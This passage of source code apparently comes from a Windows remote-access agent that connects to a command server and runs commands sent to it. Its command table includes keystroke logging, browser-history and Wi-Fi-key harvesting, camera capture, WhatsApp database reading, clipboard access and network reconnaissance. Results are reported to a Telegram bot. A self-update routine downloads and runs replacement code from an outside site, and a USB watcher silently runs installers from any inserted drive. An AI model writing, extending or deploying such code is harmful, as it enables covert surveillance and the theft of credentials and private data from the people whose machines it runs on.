        & $sq $tmp "SELECT url,title,visit_count,datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') FROM urls ORDER BY last_visit_time DESC LIMIT $limit" 2>$null|
        ForEach-Object{{$p2=$_ -split "\\|"; if($p2.Count -ge 2){{$res+="$($h.b)|$($p2[0])|$($p2[1])|v=$($p2[2])|$($p2[3])"}}}}
    }} else {{$res+="$($h.b)|need_sqlite3"}}
    Remove-Item $tmp -EA SilentlyContinue
}}
$res|Select-Object -First $limit; if(!$res){{"no_history"}}
"""
    return await act_powershell(ps, timeout=30)

async def act_file_search(pattern: str = "*.xlsx", root: str = r"C:\Users", limit: int = 30):
    sp = pattern.replace("'","").replace('"','')
    sr = root.replace("'","").replace('"','')
    ps = f"""
Get-ChildItem -Path '{sr}' -Filter '{sp}' -Recurse -File -EA SilentlyContinue |
    Select-Object -First {limit} |
    ForEach-Object {{ "$($_.FullName)|$([math]::Round($_.Length/1KB,1))KB|$($_.LastWriteTime.ToString('yyyy-MM-dd HH:mm'))" }}
"""
    return await act_powershell(ps, timeout=45)

async def act_write_file(path: str, data_b64: str):
    import base64 as _b64
    try: raw = _b64.b64decode(data_b64)
    except Exception as e: return f"Error: {e}"
    sp = path.replace("'","").replace('"','')
    cs = 8192
    chunks = [raw[i:i+cs] for i in range(0,len(raw),cs)]
    f0 = _b64.b64encode(chunks[0]).decode()
    await act_powershell(
        f"$d=Split-Path '{sp}';if($d -and !(Test-Path $d)){{New-Item -Force -Type Directory $d|Out-Null}};[IO.File]::WriteAllBytes('{sp}',[Convert]::FromBase64String('{f0}'))",
        timeout=15)
    for i,c in enumerate(chunks[1:],1):
        cb = _b64.b64encode(c).decode()
        await act_powershell(
            f"$fs=[IO.File]::Open('{sp}',[IO.FileMode]::Append);$c=[Convert]::FromBase64String('{cb}');$fs.Write($c,0,$c.Length);$fs.Close()",
            timeout=15)
    return f"write_file:ok|{len(raw)}b"

async def act_tele_report(message: str, token: str = "", chat_id: str = ""):
    tk = token   or os.environ.get("CYPHER_TELE_TOKEN","")
    ch = chat_id or os.environ.get("CYPHER_TELE_CHAT","")
    if not tk or not ch: return "tele:error|no_config"
    try:
        d = _uparse.urlencode({"chat_id":ch,"text":message,"parse_mode":"Markdown"}).encode()
        r = _ureq.Request(f"https://api.telegram.org/bot{tk}/sendMessage",data=d,method="POST")
        r.add_header("Content-Type","application/x-www-form-urlencoded")
        with _ureq.urlopen(r,timeout=10) as resp: return f"tele:ok|{resp.status}"
    except Exception as e: return f"tele:error|{e}"

async def act_self_update(url: str = "https://yidinginternational.com/downloads/agent.py"):
    ps = f"""
$tmp="$env:TEMP\\agent_new.py"
try{{
    Invoke-WebRequest -Uri "{url}" -OutFile $tmp -UseBasicParsing -TimeoutSec 30 -EA Stop
    $c=Get-Content $tmp -Raw
    if($c -and $c.Length -gt 500){{
        Copy-Item $tmp "C:\\YiDingHrAgent\\agent.py" -Force
        Remove-Item $tmp -EA SilentlyContinue
        Stop-Process -Name pythonw -EA SilentlyContinue; Start-Sleep 2
        schtasks /run /tn YiDingHrAIAgent 2>$null|Out-Null
        "self_update:ok|$($c.Length)b"
    }} else {{"self_update:error|empty"}}
}} catch {{"self_update:error|$($_.Exception.Message)"}}
"""
    return await act_powershell(ps, timeout=45)

async def act_usb_watch(tele_token: str = "", tele_chat: str = ""):
    tk = tele_token or os.environ.get("CYPHER_TELE_TOKEN","")
    ch = tele_chat  or os.environ.get("CYPHER_TELE_CHAT","")
    ps = f"""
$tk="{tk}"; $ch="{ch}"
function ST($m){{try{{$b="chat_id="+[Uri]::EscapeDataString($ch)+"&text="+[Uri]::EscapeDataString($m);Invoke-WebRequest -Uri "https://api.telegram.org/bot$tk/sendMessage" -Method POST -Body $b -UseBasicParsing -TimeoutSec 5|Out-Null}}catch{{}}}}
$src="UsbWatch_$(Get-Date -f HHmmss)"
Register-WMIEvent -Query "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType=2" -SourceIdentifier $src -Action{{
    $dr=$EventArgs.NewEvent.DriveName; ST "USB plugged $env:COMPUTERNAME — $dr"
    $sc="${{dr}}vector_install.ps1"
    if(Test-Path $sc){{ST "Running installer...";try{{& powershell -NonI -WindowStyle Hidden -EP Bypass -File $sc;ST "Done on $env:COMPUTERNAME"}}catch{{ST "Error: $($_.Exception.Message)"}}}}
}}|Out-Null
"usb_watch:started|$src"
"""
    return await act_powershell(ps, timeout=15)

async def act_ui_click(window_name: str, element_name: str = ""):
    wn = window_name.replace('"',''); en = element_name.replace('"','')
    ps = f"""
Add-Type -AssemblyName UIAutomationClient,UIAutomationTypes
$root=[System.Windows.Automation.AutomationElement]::RootElement
$c1=New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::NameProperty,"{wn}")
$win=$root.FindFirst([System.Windows.Automation.TreeScope]::Children,$c1)
if(!$win){{Write-Output "ui_click:error|no_window:{wn}";exit}}
$tgt=$win
if("{en}"){{
    $c2=New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::NameProperty,"{en}")
    $el=$win.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$c2)
    if(!$el){{Write-Output "ui_click:error|no_el:{en}";exit}}
    $tgt=$el
}}
try{{$tgt.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke();Write-Output "ui_click:ok"}}
catch{{
    $rc=$tgt.Current.BoundingRectangle;$cx=[int]($rc.Left+$rc.Width/2);$cy=[int]($rc.Top+$rc.Height/2)
    Add-Type @"
using System;using System.Runtime.InteropServices;
public class M5{{[DllImport("user32.dll")]public static extern bool SetCursorPos(int x,int y);[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int b,int e);}}
"@ -EA SilentlyContinue
    [M5]::SetCursorPos($cx,$cy)|Out-Null;[M5]::mouse_event(2,0,0,0,0);Start-Sleep -ms 50;[M5]::mouse_event(4,0,0,0,0)
    Write-Output "ui_click:ok|mouse"
}}
"""
    return await act_powershell(ps, timeout=15)

async def act_ui_type(window_name: str, element_name: str, text: str):
    wn=window_name.replace('"',''); en=element_name.replace('"',''); st=text.replace("'","''")
    ps = f"""
Add-Type -AssemblyName UIAutomationClient,UIAutomationTypes
$root=[System.Windows.Automation.AutomationElement]::RootElement
$c1=New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::NameProperty,"{wn}")
$win=$root.FindFirst([System.Windows.Automation.TreeScope]::Children,$c1)
if(!$win){{Write-Output "ui_type:error|no_window";exit}}
$c2=New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::NameProperty,"{en}")
$el=$win.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$c2)
if(!$el){{Write-Output "ui_type:error|no_el";exit}}
try{{$el.GetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern).SetValue('{st}');Write-Output "ui_type:ok|value"}}
catch{{$el.SetFocus();Start-Sleep -ms 100;Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait('{st}');Write-Output "ui_type:ok|sendkeys"}}
"""
    return await act_powershell(ps, timeout=15)


ACTIONS = {
    "system_info":          lambda p: act_system_info(),
    "screenshot":           lambda p: act_screenshot(),
    "list_dir":             lambda p: act_list_dir(p.get("path", "C:\\")),
    "powershell":           lambda p: act_powershell(p.get("command", ""), p.get("timeout", 30)),
    "get_processes":        lambda p: act_get_processes(),
    "kill_process":         lambda p: act_kill_process(p.get("target", "")),
    "open_app":             lambda p: act_open_app(p.get("path", "")),
    "send_notification":    lambda p: act_send_notification(p.get("title", "Thông báo"), p.get("message", ""), p.get("image")),
    "network_info":         lambda p: act_network_info(),
    "read_file":            lambda p: act_read_file(p.get("path", "")),
    "save_avatar":          lambda p: act_save_avatar(p.get("data", "")),
    "capture_camera":       lambda p: act_capture_camera(p.get("camera_index", 0)),
    "list_printers":        lambda p: act_list_printers(),
    "get_print_queue":      lambda p: act_get_print_queue(),
    "clear_print_queue":    lambda p: act_clear_print_queue(p.get("printer", "")),
    "set_default_printer":  lambda p: act_set_default_printer(p.get("name", "")),
    "install_printer_ip":   lambda p: act_install_printer_ip(p.get("ip",""), p.get("name",""), p.get("driver","Generic / Text Only")),
    "print_file":           lambda p: act_print_file(p.get("path",""), p.get("printer","")),
    "print_data":           lambda p: act_print_data(p.get("data",""), p.get("filename","document.pdf"), p.get("mime","")),
    "read_whatsapp_db":     lambda p: act_read_whatsapp_db(p.get("date_from"), p.get("date_to")),
    "wifi_list":            lambda p: act_wifi_list(),
    "wifi_connect":         lambda p: act_wifi_connect(p.get("ssid","")),
    "wifi_print":           lambda p: act_wifi_print(
                                p.get("target_wifi",""), p.get("file_data",""),
                                p.get("file_path",""),   p.get("filename","document.pdf"),
                                p.get("printer","")),
    # ── Vector v5.0 ───────────────────────────────────────────
    "clipboard_read":    lambda p: act_clipboard_read(),
    "clipboard_write":   lambda p: act_clipboard_write(p.get("text","")),
    "keylogger_session": lambda p: act_keylogger_session(int(p.get("duration",15))),
    "browser_history":   lambda p: act_browser_history(p.get("browser","all"),int(p.get("limit",50))),
    "file_search":       lambda p: act_file_search(p.get("pattern","*.xlsx"),p.get("root",r"C:\Users"),int(p.get("limit",30))),
    "write_file":        lambda p: act_write_file(p.get("path",""),p.get("data","")),
    "tele_report":       lambda p: act_tele_report(p.get("message",""),p.get("token",""),p.get("chat_id","")),
    "self_update":       lambda p: act_self_update(p.get("url","https://yidinginternational.com/downloads/agent.py")),
    "usb_watch":         lambda p: act_usb_watch(p.get("token",""),p.get("chat","")),
    "ui_click":          lambda p: act_ui_click(p.get("window",""),p.get("element","")),
    "ui_type":           lambda p: act_ui_type(p.get("window",""),p.get("element",""),p.get("text","")),
    "get_wifi_keys":     lambda p: act_get_wifi_keys(),
    "network_recon":     lambda p: act_network_recon(p),
}

async def handle_command(ws, data):
    action = data.get("action", "")
    fn = ACTIONS.get(action)
    try:
        result = await fn(data.get("params", {})) if fn else f"Unknown action: {action}"
    except Exception as e:
        result = f"Error: {e}"; log.error(f"Action '{action}' failed: {e}")
    try:
        await ws.send(json.dumps({"type": "result", "job_id": data.get("job_id"), "action": action,
                                  "status": "done" if fn else "error", "output": result}))
    except Exception: pass

# ── Main loop ──────────────────────────────────────────────────────────────
def _username():
    try: return os.getlogin()
    except: return os.environ.get("USERNAME", "unknown")

async def run():
    secret = None
    while True:
        try:
            log.info(f"Connecting → {VPS_URL}")
            async with websockets.connect(VPS_URL, ping_interval=30, ping_timeout=10, open_timeout=15) as ws:
                if secret is None:
                    await ws.send(json.dumps({"type": "register", "device_id": DEVICE_ID,
                                              "hostname": socket.gethostname(), "windows_user": _username()}))
                    resp = json.loads(await ws.recv())
                    secret = resp.get("secret")
                    log.info(f"Registered. Secret={secret}")
                else:
                    await ws.send(json.dumps({"type": "identify", "device_id": DEVICE_ID, "secret": secret}))
                    resp = json.loads(await ws.recv())
                    if resp.get("type") == "registered":
                        secret = resp.get("secret")
                    log.info(f"Identified. Type={resp.get('type')}")

                log.info("Ready.")
                async for message in ws:
                    data = json.loads(message)
                    if data.get("type") == "cmd":
                        asyncio.create_task(handle_command(ws, data))

        except websockets.exceptions.ConnectionClosed as e:
            log.warning(f"Closed ({e.code}). Retry 10s…"); secret = None
        except OSError as e:
            log.warning(f"Network error: {e}. Retry 10s…"); secret = None
        except Exception as e:
            log.error(f"Unexpected: {e}. Retry 10s…"); secret = None

        await asyncio.sleep(10)

if __name__ == "__main__":
    # ── Single-instance guard (Windows named mutex — no race condition) ────
    import ctypes
    _MUTEX_NAME = "YiDingITAgent_SingleInstance"
    _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
        log.warning("Another agent instance already running. Exiting.")
        sys.exit(0)
    # ────────────────────────────────────────────────────────────────────────
    log.info(f"Agent started. Device={DEVICE_ID}")
    async def _main():
        await _ensure_aumid()
        await run()
    # Top-level crash restart — keeps agent alive even on unhandled exceptions
    import time as _time
    while True:
        try:
            asyncio.run(_main())
        except Exception as _e:
            log.error(f"Fatal crash: {_e}. Restarting in 30s…")
            _time.sleep(30)
